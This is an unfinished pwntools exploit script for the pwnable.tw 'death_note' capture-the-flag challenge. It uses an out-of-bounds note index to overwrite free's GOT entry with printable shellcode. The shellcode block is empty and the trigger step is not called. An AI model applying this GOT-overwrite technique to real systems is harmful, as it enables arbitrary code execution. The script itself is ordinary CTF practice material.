#!/usr/bin/env python3

import pwn
import struct

if pwn.args['LOCAL']:
	io = pwn.process('./death_note')
else:
	io = pwn.remote('chall.pwnable.tw', 10201)

elf = pwn.ELF('./death_note')

def add_note(index, name):
	io.recvuntil('Your choice :')
	io.sendline(str(1))
	io.recvuntil('Index :')
	io.sendline(str(index))
	io.recvuntil('Name :')
	io.sendline(name)

if pwn.args['GDB']:
	pwn.context.terminal = ['tmux', 'splitw', '-h']
	pwn.gdb.attach(io, '''
		source ~/peda/peda.py
	''')

free_got = elf.got[b'free']
note = elf.sym[b'note']
index = (free_got - note) // 4

pwn.context.arch = 'i386'
shellcode = pwn.asm('''
	
''')

for ch in shellcode:
	i = struct.unpack('b', bytes([ch]))[0]
	if i <= 0x1f or i == 0x7f:
		print('fail: ', hex(ch))
		raise ValueError

print('success')

add_note(index, shellcode)

def del_note(index):
	io.recvuntil('Your choice :')
	io.sendline(str(3))
	io.recvuntil('Index :')
	io.sendline(str(index))

